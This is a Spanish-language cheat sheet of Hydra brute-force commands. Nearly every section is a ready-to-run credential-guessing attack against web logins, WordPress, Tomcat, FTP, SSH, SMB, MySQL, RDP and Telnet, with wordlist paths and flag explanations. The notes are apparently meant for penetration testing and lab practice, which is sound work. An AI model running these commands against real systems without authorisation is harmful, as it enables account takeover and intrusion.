# Hydra 

Tags: #Hydra 

Es una herramienta de prueba de penetración que se utiliza para realizar ataques de fuerza bruta, por así decirlo, en servicios de autenticación remotos. Esta herramientas nos ayuda a poder encontrar passwd mediante ataques furtivos. 

```bash 
- Soporte de múltiples protocolos: Hydra es compatible con una amplia gama de protocolos de autenticación incluyendo: SSH, Telnet, FTP, HTTP, POP3, SMB, etc...
* Fuerza bruta avanzada: Hydra es capas de realizar ataques de fuerza bruta avanzados, incluyendo ataques de diccionario y ataques basados en patrones. 
- Podemos usar los diccionarios que ya viene en Parrot o Kali Linux (rockyou.txt)
- Modos de operación flexibles: Hydra admite diferentes modos de operación, incluyendo modo de ataque directo, modo de ataque de diccionario y modo de ataque híbrido.
- Capacidad de paralelización: Hydra es capas de realizar múltiples intentos de autenticación simultáneamente, lo que mejora la velocidad y la eficiencia del ataque. 

- Casos de uso:
	- Pruebas de penetración 
	- Auditoria de passwd
	- Recuperación de passwd
```


```python 
# Directorios 'passwords'
❯ /usr/share/wordlists/rockyou.txt
❯ /usr/share/Seclists/Passwords/xato-net-10-million-password-10000.txt
❯ /usr/share/Seclists/Passwords/months.txt
❯ /usr/share/Seclists/Passwords/seasons.txt
❯ /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
❯ /usr/share/wordlists/metasploit/unix-passwords.txt
❯ /usr/share/wordlists/metasploit/common_passwords.txt

# Directorios 'Users'
❯ /usr/share/Seclists/Usernames/xato-net-10-million-usernames.txt
❯ /usr/share/Seclists/Usernames/top-usernames-shortlist.txt 
❯ /usr/share/Seclists/Usernames/Names/names.txt
❯ /usr/share/metasploit-framework/data/wordlists/unix_users.txt
❯ /usr/share/wordlists/metasploit/unix_users.txt
❯ /usr/share/wordlists/metasploit/common_users.txt
```

## Fuerza bruta a una autenticación digital 

```bash 
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /DIR/ 

	# IP = Dirección IP del servidor que contiene la autenticación
	# DIR = Ruta donde se encuentra el login de autenticación

```

```bash 
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V -I -t 4   

	# /admin = Ruta donde se encuentra el login de autenticación
```

## Fuerza bruta a DVWA

```bash 
❯ hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=low:F=Username and/or password incorrect'

❯ hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=medium:F=Username and/or password incorrect' -V -I 

Nota: 
	1. Los datos salen del 'Inspector > Network' y es la ruta donde se encuentra el login de autenticación
	2. La cookie sale en 'Inspector > Storage'
```

## Fuerza bruta a un CMS

```bash 
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -t 64 -F 

	# El formulario debe de cumplir con tres variables
	# 1ra = Ruta desde la raiz hasta el admin.php
	# 2do = Podemos obtener las variables de username y password capturando el trafico con 'Burpsuite' ya que ahi es donde las variables de usuario y variables del diccionario van a ser sustituidas 
	# 3ro = Colocar el mensaje de error, lo podemos encontrar en el codigo del panel del login 'Ctrl + u'
	# IP = La direccion IP de la maquina victima sin el protocolo 'http o https'
	# F = Cuando hydra encuentre unas credenciales validas detendra el proceso y seguira con otro usuario en caso de tener mas 
```

## Hydra fuerza bruta WordPress

```python
# Para identificar los usuarios 
❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'
❯ hydra -L users.txt -p something <IP> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'  # Otra forma de hacerlo
	# p = Colocar una passwd random, porque lo unico que se busca es el usuario


# Esto se usa para saber la password del usuario que se ha encontrado 'admin'
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 15 
	# t = Lanzar las tareas en paralelo al mismo tiempo 


# Si al momento de hacer login en la pagina muestra un mensaje de error, seria de esta manera en donde se colocará el mensaje de error en la sentencia. 
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt <IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"


# Fuerza bruta a WordPress (Todo lo anterior se obtiene de la página web en 'form action=/login.php') y hay que colocar todas la etiquetas 

	# l (ele) = Usuario de login
	# P = Ruta del diccionario
	# log y pwd = Se encuentra en el apartado de la pagina web 'Ctrl + u' 
	# S = Redireccionamiento con el codigo 302
	# F = Error que muestra el panel de autenticacion, por si no sirve con el 'S'
```

## Hydra fuerza bruta WebDAV

```python 
❯ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ❮IP❯ http-get /webdav/

	# webdav = Directorio de autenticacion 
	# L = Indicas un archivo que disponga de usuarios para login
	# P = Ruta del diccionario o 'archivo que contiene passwds'
```

## Tomcat 

```bash 
❯ hydra -l tomcat -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt <IP> -s 8080 http-get /manager/html/ 

	# s = Indicar el puerto 8080
	# L = /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
	# IP = Direccion IP del servidor que contiene la autenticacion que solicita user/passwd para acceder a la pagina
	# http-get = Ruta que contiene el panel de autenticacion '/manager/html/ o /host-manager/html' 
```

## Hydra fuerza bruta FTP

```ruby
❯ hydra -L Usernames.txt -p ' ' ❮IP❯ ftp      # Fuerza bruta al puerto 21 'FTP' sin colocar password 

❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 

❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp -t 4 -I

	# l (ele) = Usuario valido
	# L = Archivo de texto que contiene usuarios 
	# P = Ruta del diccionario de passwords
	# t = Lanzar tareas en paralelo al mismo tiempo
	# I = Saltar la espera 
```

## Hydra fuerza bruta SSH

```bash 
# Una forma de saber los usuarios dentro de la maquina por SSH es:

1. Mirando el '/etc/passwd'
2. Mirando el directorio '/home'
```

```python
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t      # Fuerza bruta al puerto 22 'SSH'

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# L = Ruta del diccionario o 'archivo que contiene users' para login
	# t = Lanzar tareas en paralelo al mismo tiempo

❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ❮IP❯ ssh
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# l (ele) = Usuario login que en este caso es  'root'
	# t = Lanzar tareas en paralelo al mismo tiempo
	# V = Verbosity
	# s = Port y es el puerto al que nos queremos conectar 
```

## Hydra fuerza bruta SMB / SAMBA

```python 
# Si esta  la version 'SMBv1', no podremos usar esta herramienta para Fuerza Bruta, solo con Metasploit

❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta en el servidor SMB
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb

❯ hydra -L user.list -P password.list smb://<IP> 

	# L = Ruta o archivo que contiene los usuarios para login
	# P = Ruta o archivo que contiene las passwd
	# l = Un usuario en especifico para login 
```

## Hydra fuerza bruta MYSQL

```python
❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> mysql
❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://<IP>

	# P = Ruta o archivo que contiene las passwd
	# l = Un usuario en especifico para login 
```

## Hydra fuerza bruta RDP

```python 
# Fuerza bruta a RDP
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           

	# L = Ruta o archivo que contiene los usuarios para login 
	# P = Ruta o archivo que contiene las passwd
	# s = Especificas el puerto, si no lo haces Hydra asumira que es el puerto 3389
```

## Hydra fuerza bruta Telnet 

```bash 
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> telnet 

	# L = Ruta o archivo que contiene los usuarios para login 
	# P = Ruta o archivo que contiene las passwd
```

